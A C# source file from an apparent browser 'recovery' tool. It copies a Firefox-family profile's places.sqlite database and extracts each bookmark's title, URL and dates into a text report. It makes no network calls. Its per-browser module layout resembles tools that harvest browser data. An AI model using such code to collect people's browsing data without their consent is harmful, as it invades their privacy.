using Microsoft.Data.Sqlite;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoBookmarks
    {
        public static async Task RecoverAsync(string browserName, string browserRelativePath)
        {
            await GeckoCommon.RecoverDataAsync(browserName, "Bookmarks", ProcessProfileAsync, "bookmarks.txt");
        }

        private static async Task<string> ProcessProfileAsync(string profilePath)
        {
            var sb = new StringBuilder();
            string placesDbPath = Path.Combine(profilePath, "places.sqlite");
            if (!File.Exists(placesDbPath))
            {
                return string.Empty;
            }

            string tempDbPath = await GeckoCommon.CopyDatabaseToTempAsync(placesDbPath, "places");
            if (string.IsNullOrEmpty(tempDbPath)) return string.Empty;

            try
            {
                using var connection = await GeckoCommon.OpenSqliteConnectionAsync(tempDbPath);
                string query = @"
                        SELECT 
                            moz_bookmarks.title,
                            moz_places.url,
                            moz_bookmarks.dateAdded,
                            moz_bookmarks.lastModified
                        FROM 
                            moz_bookmarks
                        LEFT JOIN 
                            moz_places ON moz_bookmarks.fk = moz_places.id
                        WHERE 
                            moz_bookmarks.type = 1
                        ORDER BY 
                            moz_bookmarks.dateAdded ASC;";

                using var command = new SqliteCommand(query, connection);
                using var reader = await command.ExecuteReaderAsync();
                while (await reader.ReadAsync())
                {
                    string title = reader["title"] as string ?? "Untitled";
                    string url = reader["url"] as string ?? "No URL";
                    long dateAdded = reader["dateAdded"] != DBNull.Value ? Convert.ToInt64(reader["dateAdded"]) : 0;
                    long lastModified = reader["lastModified"] != DBNull.Value ? Convert.ToInt64(reader["lastModified"]) : 0;
                    var dateAddedDt = GeckoCommon.UnixTimeStampToDateTime(dateAdded / 1000);
                    var lastModifiedDt = GeckoCommon.UnixTimeStampToDateTime(lastModified / 1000);
                    sb.AppendLine($"Title: {title}");
                    sb.AppendLine($"URL: {url}");
                    sb.AppendLine($"Date Added: {dateAddedDt}");
                    sb.AppendLine($"Last Modified: {lastModifiedDt}");
                    sb.AppendLine(new string('-', 50));
                }
            }
            catch
            {
                return string.Empty;
            }
            return sb.ToString();
        }
    }
}
